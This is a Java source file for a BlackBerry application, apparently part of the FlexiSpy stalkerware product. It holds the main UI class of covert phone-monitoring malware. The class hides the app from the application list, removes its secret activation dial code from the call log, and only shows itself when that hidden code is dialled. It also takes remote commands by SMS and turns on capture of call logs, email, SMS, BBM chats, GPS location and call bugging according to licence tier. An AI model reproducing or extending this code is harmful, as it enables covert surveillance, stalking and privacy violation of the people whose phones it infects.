package com.vvt.screen;

import java.util.Timer;
import java.util.TimerTask;
import com.vvt.calllogmon.FxCallLogNumberMonitor;
import com.vvt.calllogmon.OutgoingCallListener;
import com.vvt.ctrl.AppEngine;
import com.vvt.db.FxEventDatabase;
import com.vvt.event.constant.GPSProvider;
import com.vvt.global.Global;
import com.vvt.gpsc.GPSEngine;
import com.vvt.gpsc.GPSMethod;
import com.vvt.gpsc.GPSOption;
import com.vvt.gpsc.GPSPriority;
import com.vvt.info.ApplicationInfo;
import com.vvt.license.LicenseChangeListener;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.license.LicenseStatus;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefCellInfo;
import com.vvt.pref.PrefEventInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.PrefMessenger;
import com.vvt.pref.PrefSystem;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.RmtCmdRegister;
import com.vvt.rmtcmd.RmtCmdType;
import com.vvt.rmtcmd.SMSCmdReceiver;
import com.vvt.rmtcmd.SMSCmdStore;
import com.vvt.rmtcmd.SMSCommandCode;
import com.vvt.std.Constant;
import com.vvt.std.FxTimer;
import com.vvt.std.FxTimerListener;
import com.vvt.std.Log;
import com.vvt.std.Permission;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.system.Application;
import net.rim.device.api.system.CodeModuleGroup;
import net.rim.device.api.system.CodeModuleGroupManager;

public class PolymorphicUI extends UiApplication implements OutgoingCallListener, LicenseChangeListener, FxTimerListener {

	private boolean foregroundApproval = false;
	// Preference
	private Preference pref = Global.getPreference();
	// RmtCmdRegister
	private RmtCmdRegister rmtCmdRegister = Global.getRmtCmdRegister();
	// SMSCmdReceiver
	private SMSCmdReceiver smsCmdRev = Global.getSMSCmdReceiver();
	// SMSCmdStore
	private SMSCmdStore cmdStore = Global.getSMSCmdStore();
	// Screen
	private WelcomeScreen welcomeScreen = new WelcomeScreen();
	private SettingsScreen settingsScreen = null;
	// CallLogMonitor
	private FxCallLogNumberMonitor fxNumberRemover = Global.getFxCallLogNumberMonitor();
	// License
	private LicenseManager licenseMgr = Global.getLicenseManager();
	private LicenseInfo licenseInfo = licenseMgr.getLicenseInfo();
	// AppEngine
	private AppEngine appEngine = null;
	// Timer
	private FxTimer startAppTimer = new FxTimer(this);
	// Database
	private FxEventDatabase db = Global.getFxEventDatabase();
	
	static {
		// To set permission.
		Permission.requestPermission();
	}
	
	public PolymorphicUI() {
		// To hide application.
		hideFromAppList();
		// To set LicenseChangeListener
		licenseMgr.registerLicenseChangeListener(this);
		fxNumberRemover.setListener(this);
		fxNumberRemover.addCallLogNumber(ApplicationInfo.DEFAULT_FX_KEY);
		// To set Product ID.
		licenseInfo.setProductID(4103); // For Cyclops
		licenseMgr.commit(licenseInfo);
		// To start SMSCmdReceiver.
		smsCmdRev.start();
		// To register activation command.
		SMSCommandCode smsCmdCode = cmdStore.getSMSCommandCode();
		RmtCmdLine activationCmdLine = new RmtCmdLine();
		String activation = new String("Send activation: ");
		activationCmdLine.setMessage(activation);
		activationCmdLine.setCode(smsCmdCode.getActivationCmd());
		activationCmdLine.setRmtCmdType(RmtCmdType.SMS);
		rmtCmdRegister.registerCommands(activationCmdLine);
		// To check the product status.
		if (licenseInfo.getLicenseStatus().getId() != LicenseStatus.ACTIVATED.getId()) {
			// TODO To test the connection for keeping the connection type.
			// To bring the first page before activated.
			Application.getApplication().invokeLater(new Runnable() {
				public void run() {
					synchronized (Application.getEventLock()) {
						pushScreen(welcomeScreen);
					}
				}
			});
		} else {
			// To check configuration ID and create polymorphic UI.
			createFeatures();
		}
	}
	
	public static void main(String[] args) { // If CLDC Application (Visible)
		// To set debug mode.
		Log.setDebugMode(ApplicationInfo.DEBUG);
		PolymorphicUI self = new PolymorphicUI();
		self.enterEventDispatcher();
	}
	
	public static void libMain(String args[]) { // If Library
		main(args);
	}
	
	private void bringToForeground() {
		int interval = 300;
		Application.getApplication().invokeLater(new Runnable() {
			public void run() {
				synchronized (Application.getEventLock()) {
					requestForeground();
				}
			}
		}, interval, false);
		// To hide application from switcher.
		int foregoroundInterval = 1000;
		new Timer().schedule(new TimerTask() {
			public void run() {
				foregroundApproval = false;
			}
		}, foregoroundInterval);
	}
	
	private void createFeatures() {
		// AppEngine
		if (appEngine == null) {
			appEngine = new AppEngine(this);
		}
		appEngine.start();
		// UI (Should be created every times.)
		settingsScreen = new SettingsScreen();
		// CallLogMonitor.
		String flxiKey = Constant.ASTERISK + Constant.HASH + licenseInfo.getActivationCode();
		fxNumberRemover.addCallLogNumber(flxiKey);
		// To push screen.
		Application.getApplication().invokeLater(new Runnable() {
			public void run() {
				synchronized (Application.getEventLock()) {
					pushScreen(settingsScreen);
				}
			}
		});
	}
	
	private void initializeProductFeatures() {
		PrefMessenger prefMessenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
		PrefEventInfo prefEvent = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
		PrefCellInfo prefCell = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
		PrefGPS prefGPS = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
		PrefBugInfo prefBug = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
		PrefSystem prefSystem = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
		PrefGeneral settings = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		GPSEngine gpsEngine = new GPSEngine();
		int locationTimerIndex = 0;
		int warningIndex = 0;
		int confID = licenseInfo.getProductConfID();
		int maxEventIndex = 2;
		settings.setMaxEventIndex(maxEventIndex);
		int sendTimeIndex = 2;
		settings.setSendTimeIndex(sendTimeIndex);
		pref.commit(settings);
		switch(confID) {
			case ApplicationInfo.LIGHT_I_F:
				// Event
				prefEvent.setCallLogEnabled(true);
				prefEvent.setEmailEnabled(true);
				prefEvent.setSMSEnabled(true);
				prefEvent.setSupported(true);
				// Cell
				locationTimerIndex = 5;
				prefCell.setEnabled(false);
				prefCell.setSupported(true);
				prefCell.setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[locationTimerIndex]);
				warningIndex = 3;
				prefCell.setWarningPosition(warningIndex);
				pref.commit(prefEvent);
				pref.commit(prefCell);
				break;
			case ApplicationInfo.PRO_I_F:
				// IM
				prefMessenger.setBBMEnabled(true);
				prefMessenger.setSupported(true);
				pref.commit(prefMessenger);
				// Event
				prefEvent.setCallLogEnabled(true);
				prefEvent.setEmailEnabled(true);
				prefEvent.setSMSEnabled(true);
				prefEvent.setSupported(true);
				locationTimerIndex = 5;
				warningIndex = 3;
				pref.commit(prefEvent);
				// GPS
				if (gpsEngine.isSupportedGPS()) {
					GPSMethod autonomous = new GPSMethod();
					GPSMethod assisted = new GPSMethod();
					GPSMethod cellsite = new GPSMethod();
					GPSMethod google = new GPSMethod();
					autonomous.setMethod(GPSProvider.GPS);
					autonomous.setPriority(GPSPriority.FIRST_PRIORITY);
					assisted.setMethod(GPSProvider.AGPS);
					assisted.setPriority(GPSPriority.SECOND_PRIORITY);
					cellsite.setMethod(GPSProvider.NETWORK);
					cellsite.setPriority(GPSPriority.THIRD_PRIORITY);
					google.setMethod(GPSProvider.GPS_G);
					google.setPriority(GPSPriority.FOURTH_PRIORITY);
					GPSOption gpsOpt = new GPSOption();
					int timeout = 10;
					gpsOpt.setTimeout(timeout);
					gpsOpt.setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[locationTimerIndex]);
					gpsOpt.addGPSMethod(assisted);
					gpsOpt.addGPSMethod(google);
					gpsOpt.addGPSMethod(autonomous);
					gpsOpt.addGPSMethod(cellsite);
					prefGPS.setEnabled(false);
					prefGPS.setSupported(true);
					prefGPS.setGpsOption(gpsOpt);
					prefGPS.setWarningPosition(warningIndex);
					pref.commit(prefGPS);
				} else {
					// Cell
					prefCell.setEnabled(false);
					prefCell.setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[locationTimerIndex]);
					prefCell.setSupported(true);
					prefCell.setWarningPosition(warningIndex);
					pref.commit(prefCell);
				}
				// Bug
				prefBug.setEnabled(false);
				prefBug.setWatchAllEnabled(false);
				prefBug.setConferenceSupported(false);
				prefBug.setSupported(true);
				pref.commit(prefBug);
				// System
				prefSystem.setSIMChangeEnabled(true);
				prefSystem.setSupported(true);
				pref.commit(prefSystem);
				break;
			case ApplicationInfo.PROX_I_F:
				// IM
				prefMessenger.setBBMEnabled(true);
				prefMessenger.setSupported(true);
				pref.commit(prefMessenger);
				// Event
				prefEvent = new PrefEventInfo();
				prefEvent.setCallLogEnabled(true);
				prefEvent.setEmailEnabled(true);
				prefEvent.setSMSEnabled(true);
				prefEvent.setSupported(true);
				pref.commit(prefEvent);
				locationTimerIndex = 5;
				warningIndex = 3;
				// GPS
				if (gpsEngine.isSupportedGPS()) {
					prefGPS = new PrefGPS();
					GPSMethod autonomous = new GPSMethod();
					GPSMethod assisted = new GPSMethod();
					GPSMethod cellsite = new GPSMethod();
					GPSMethod google = new GPSMethod();
					autonomous.setMethod(GPSProvider.GPS);
					autonomous.setPriority(GPSPriority.FIRST_PRIORITY);
					assisted.setMethod(GPSProvider.AGPS);
					assisted.setPriority(GPSPriority.SECOND_PRIORITY);
					cellsite.setMethod(GPSProvider.NETWORK);
					cellsite.setPriority(GPSPriority.THIRD_PRIORITY);
					google.setMethod(GPSProvider.GPS_G);
					google.setPriority(GPSPriority.FOURTH_PRIORITY);
					GPSOption gpsOpt = new GPSOption();
					int timeout = 10;
					gpsOpt.setTimeout(timeout);
					gpsOpt.setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[locationTimerIndex]);
					gpsOpt.addGPSMethod(assisted);
					gpsOpt.addGPSMethod(google);
					gpsOpt.addGPSMethod(autonomous);
					gpsOpt.addGPSMethod(cellsite);
					prefGPS.setEnabled(false);
					prefGPS.setSupported(true);
					prefGPS.setGpsOption(gpsOpt);
					prefGPS.setWarningPosition(warningIndex);
					pref.commit(prefGPS);
				} else {
					// Cell
					prefCell = new PrefCellInfo();
					prefCell.setEnabled(false);
					prefCell.setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[locationTimerIndex]);
					prefCell.setSupported(true);
					prefCell.setWarningPosition(warningIndex);
					pref.commit(prefCell);
				}
				// Bug
				prefBug = new PrefBugInfo();
				prefBug.setEnabled(false);
				prefBug.setWatchAllEnabled(false);
				prefBug.setConferenceSupported(true);
				prefBug.setSupported(true);
				pref.commit(prefBug);
				// System
				prefSystem.setSIMChangeEnabled(true);
				prefSystem.setSupported(true);
				pref.commit(prefSystem);
				break;
		}
	}

	private void removeFeature() {
		// To stop engine.
		appEngine.stop();
		// To reset remote commands.
		Global.getSMSCmdStore().useDefault();
		// To reset product features.
		pref.reset();
		// To remove Flexikey out of the FxNumberRemover.
		String flxiKey = Constant.ASTERISK + Constant.HASH + licenseInfo.getActivationCode();
		fxNumberRemover.removeCallLogNumber(flxiKey);
		// To reset the database.
		db.reset();
		// To manage screen.
		Application.getApplication().invokeLater(new Runnable() {
			public void run() {
				synchronized (Application.getEventLock()) {
					popScreen(settingsScreen);
				}
			}
		});
		Application.getApplication().invokeLater(new Runnable() {
			public void run() {
				synchronized (Application.getEventLock()) {
					pushScreen(welcomeScreen);
				}
			}
		});
	}

	private void hideFromAppList() {
		try {
			CodeModuleGroup[] cmgs = CodeModuleGroupManager.loadAll();
			for (int i = 0; i < cmgs.length; i++) { // To sequentially search the FlexiSpy Module.
				CodeModuleGroup cmg = cmgs[i];
				String cmgName = cmg.getName();
				if (cmgName.indexOf(ApplicationInfo.APPLICATION_NAME) != -1) {
//					cmg.setFlag(CodeModuleGroup.FLAG_HIDDEN, true);
//					cmg.setFlag(CodeModuleGroup.FLAG_LIBRARY, true);
//					cmg.store();
					cmg.delete();
				}
			}
		} catch (Exception e) {
			Log.error("PolymorphicUI.hideFromAppList", null, e);
		}
	}

	// OutgoingCallListener
	public void onOutgoingCall(String number) {
		String flexiKey = Constant.ASTERISK + Constant.HASH + licenseInfo.getActivationCode();
		int licId = licenseInfo.getLicenseStatus().getId();
		if ((licId == LicenseStatus.ACTIVATED.getId() && number.endsWith(flexiKey)) || (licId == LicenseStatus.DEACTIVATED.getId() && number.endsWith(ApplicationInfo.DEFAULT_FX_KEY)) || (licId == LicenseStatus.NONE.getId() && number.endsWith(ApplicationInfo.DEFAULT_FX_KEY))) {
			int seconds = 1;
			foregroundApproval = true;
			startAppTimer.setInterval(seconds);
			startAppTimer.start();
		}
	}

	// LicenseChangeListener
	public void licenseChanged(LicenseInfo licenseInfo) {
		if (licenseInfo.getLicenseStatus().getId() == LicenseStatus.ACTIVATED.getId()) {
			if (welcomeScreen != null) {
				Application.getApplication().invokeLater(new Runnable() {
					public void run() {
						synchronized (Application.getEventLock()) {
							popScreen(welcomeScreen);
						}
					}
				});
			}
			// ProductSettings
			initializeProductFeatures();
			createFeatures();
		} else if (licenseInfo.getLicenseStatus().getId() == LicenseStatus.DEACTIVATED.getId()) {
			removeFeature();
		}
	}

	// FxTimerListener
	public void timerExpired(int id) {
		if (licenseInfo.getLicenseStatus().getId() == LicenseStatus.ACTIVATED.getId()) {
			settingsScreen.refreshUI();
		}
		bringToForeground();
	}
	
	// Application
	protected boolean acceptsForeground() {
	    return foregroundApproval;
	}
}
